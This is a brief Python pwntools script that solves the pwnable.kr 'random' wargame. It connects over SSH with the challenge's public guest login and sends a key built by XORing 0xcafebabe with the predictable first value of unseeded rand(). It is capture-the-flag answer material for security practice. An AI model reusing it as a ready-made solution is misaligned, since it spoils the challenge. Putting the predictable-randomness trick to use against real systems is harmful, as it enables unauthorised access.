#!/usr/bin/env python3
from pwn import *
s = ssh(host="pwnable.kr", port=2222, user="random", password="guest")
io = s.process("./random")
number = 0xcafebabe ^ 0x6b8b4567 
io.sendline(str(number).encode())

io.interactive()